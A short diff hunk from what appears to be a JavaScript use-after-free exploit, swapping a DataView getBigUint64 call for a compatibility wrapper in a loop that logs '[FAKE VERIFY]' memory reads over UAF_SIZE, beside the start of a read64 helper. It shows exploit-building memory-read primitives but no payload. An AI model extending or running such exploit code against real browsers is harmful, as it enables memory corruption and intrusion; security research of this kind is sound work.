@@ -198,7 +198,7 @@ addEventListener('unhandledrejection', event => {
  
   const dv = new DataView(buf.buffer);
  for (let i = 0; i < UAF_SIZE; i += 8) {
-  let q = dv.getBigUint64(i, true);
+ let q = getBigUint64Compat(dv, i, true);
   log(`[FAKE VERIFY] @0x${i.toString(16)} = 0x${q.toString(16)}`);
 }
   function read64(view, offset) {
